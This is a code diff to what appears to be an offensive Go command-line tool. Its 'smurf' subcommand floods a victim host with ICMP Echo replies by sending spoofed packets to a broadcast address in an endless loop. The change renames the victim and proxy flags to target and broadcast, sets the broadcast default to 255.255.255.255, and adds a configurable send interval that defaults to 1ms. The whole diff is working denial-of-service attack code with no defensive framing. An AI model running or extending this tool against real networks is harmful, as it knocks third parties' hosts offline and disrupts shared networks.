@@ -14,39 +14,38 @@ import (
 var version string // injected at build-time
 
 func smurfValidator(ctx *cli.Context) error {
-	return assertSet(ctx, victimFlag, proxyFlag)
+	return assertSet(ctx, targetFlag)
 }
 
 func smurfHandler(ctx *cli.Context) error {
-	banner := "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"
+	banner := "Victim: %s\nBroadcasting ICMP to: %s\nEvery: %s\nPayload:\n---\n%v---\n"
 
-	victim := net.ParseIP(ctx.String(name(victimFlag)))
-	if victim == nil {
-		return errors.New("invalid victim IP address")
+	target := net.ParseIP(ctx.String(name(targetFlag)))
+	if target == nil {
+		return errors.New("invalid target IP address")
 	}
 
-	proxy := net.ParseIP(ctx.String(name(proxyFlag)))
-	if proxy == nil {
-		return errors.New("invalid proxy IP address")
+	broadcast := net.ParseIP(ctx.String(name(broadcastFlag)))
+	if broadcast == nil {
+		return errors.New("invalid broadcast IP address")
 	}
 
-	gw, err := net.ParseMAC(ctx.String(name(gatewayFlag)))
+	every, err := time.ParseDuration(ctx.String(name(everyFlag)))
 	if err != nil {
-		return errors.Wrap(err, "could not parse gateway MAC address")
+		return errors.New("invalid time string given")
 	}
 
-	p, err := newPwner(victim, proxy, ctx.String(name(ifaceFlag)), gw)
+	p, err := newPwner(target, broadcast, ctx.String(name(ifaceFlag)))
 	if err != nil {
 		return err
 	}
 
-	interval := time.Nanosecond * 1
-	fmt.Printf(banner, victim, proxy, interval.String(), hex.Dump(p.payload))
+	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(p.payload))
 	for {
 		if err = p.execute(); err != nil {
 			return err
 		}
-		time.Sleep(interval)
+		time.Sleep(every)
 	}
 }
 
@@ -61,11 +60,10 @@ func main() {
 			Aliases: []string{"s"},
 			Usage:   "make a network overwhelm a host with ICMP Echo replies",
 			Flags: []cli.Flag{
-				asMandatory(victimFlag),
-				asMandatory(proxyFlag),
-				// default is pumping frames out to broadcast MAC
-				withDefault(gatewayFlag, "FF:FF:FF:FF:FF:FF"),
+				asMandatory(targetFlag),
+				withDefault(broadcastFlag, "255.255.255.255"),
 				withDefault(ifaceFlag, "en0"),
+				withDefault(everyFlag, "1ms"),
 			},
 			Before: smurfValidator,
 			Action: smurfHandler,
